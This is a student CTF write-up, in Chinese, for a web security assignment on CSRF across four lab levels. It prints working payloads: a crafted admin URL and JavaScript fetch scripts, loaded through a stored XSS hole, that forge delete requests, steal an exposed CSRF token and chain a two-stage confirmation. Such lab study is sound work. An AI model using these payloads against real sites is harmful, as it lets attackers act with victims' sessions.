### Web Security Assignment 2 - CSRF	Write up



#### Level 1.  

我们首先尝试一下直接删除这个帖子，利用调试工具截取网络数据包，发现这个参数传递主要借助 GET 传参方式，因此我们可以构造一个请求，利用 admin 本地的 cookie 对帖子进行操作。

![](/Users/shenyc/Pictures/Screenshot 2025-05-08 at 19.01.40.png)

具体的 url 可以如下构造：

```
http://www.ctf-ruc.site:33181/admin.php?url=http%3A%2F%2Fwww.ctf-ruc.site%3A33181%2Fapi.php%3Fid%3D1%26action%3Ddelete
```

实现了如下效果：

![](/Users/shenyc/Pictures/Screenshot 2025-05-08 at 19.09.23.png)

#### Level 2.

![](/Users/shenyc/Pictures/Screenshot 2025-05-08 at 19.16.47.png)

观察源代码，发现这一题中的传参方式改成了 POST，对于 POST 方法，想要单纯利用 URL 直接完成诱骗是比较困难的，然而本题目中却存在一个致命的 XSS 漏洞，而这个漏洞正是发布新帖子这个功能中产生的，具体的漏洞位置如下，在加载从后端收到的数据并渲染到前端时直接采用了  innerHTML 嵌入的方式，这给了我们注入代码的空间。

![](/Users/shenyc/Pictures/Screenshot 2025-05-08 at 19.56.22.png)

由于要注入的代码比较长，我们可以通过外挂一个站外 js 脚本：

```javascript
/* csrf2.js */
fetch(`api.php`, {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  },
  body: `id=1&action=delete`,
});
```

然后发布一个如下的帖子：

![](/Users/shenyc/Pictures/Screenshot 2025-05-08 at 20.03.08.png)

然后输入如下的 url 进行 csrf 诱骗：

```
http://www.ctf-ruc.site:33184/index.php?url=http%3A%2F%2Fwww.ctf-ruc.site%3A33184%2Findex.php
```

此时前端会被注入我们的站外脚本并随着页面加载自动执行，诱骗 admin 运行这段脚本会自动向后端发送一个 POST 请求，并且会以 admin 的身份认证进行，由此实现删除帖子效果。



#### Level 3.

本题与上一题唯一的不同就是使用了 token，但是 XSS 漏洞并没有被修复。更致命的是，这个 token 还被显式放在了前端，如下：

![](/Users/shenyc/Pictures/Screenshot 2025-05-08 at 20.22.05.png)

我们还是使用一个站外脚本，通过 getElementById 方法可以精确的选中这个元素，并且在请求体中使用这个元素的 value 属性即可：

```javascript
/* csrf3.js */
const token = document.getElementById("csrf_token");
fetch(`api.php`, {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  },
  body: `id=1&action=delete&csrf_token=${token.value}`,
});
```

然后发布一个新帖子：

![](/Users/shenyc/Pictures/Screenshot 2025-05-08 at 20.19.13.png)

然后使用如下的 url 的模拟 csrf 诱骗：

```
http://www.ctf-ruc.site:33191/index.php?url=http%3A%2F%2Fwww.ctf-ruc.site%3A33191%2Findex.php
```

admin 在打开主页时注入的脚本会从前端代码中提取出 token，并且将 token 填入请求自动发出，实现删除帖子的目的。



#### Level 4.

本题中删除了 token 防御方式，改为使用了一个两阶段的验证，但是 XSS 漏洞依然未修复。

![](/Users/shenyc/Pictures/Screenshot 2025-05-08 at 20.27.00.png)

经过实验发现，如果越过第一阶段的验证采用和 Level 2 类似的方法直接发送请求后端会拒绝这个请求，因此我们还得通过一个脚本模拟两个阶段的请求。我们使用这样一个站外脚本：

```javascript
/* csrf4.js */
fetch(`api.php?action=confirm`, {
  method: "GET",
}).then((response) => {
  fetch(`api.php`, {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: `id=1&action=delete`,
  });
});
```

然后同样发布一个帖子：

![](/Users/shenyc/Pictures/Screenshot 2025-05-08 at 20.31.54.png)

然后我们使用一个同样的 url 模拟 csrf 诱骗即可：

```
http://www.ctf-ruc.site:33194/index.php?url=http%3A%2F%2Fwww.ctf-ruc.site%3A33194%2Findex.php
```

当 admin 打开链接时，会自动由站外脚本发起一个两阶段的请求，第一个完成确认，第二个完成请求的伪造，如此即可完成删除帖子的任务。



---

**Reference：**

为了保证靶机可以访问脚本，所有站外脚本以及本报告均已上传 github 仓库，链接：https://github.com/YichenShen0103/csrf-test，站外脚本通过 github page 引入，链接：https://yichenshen0103.github.io/csrf-test。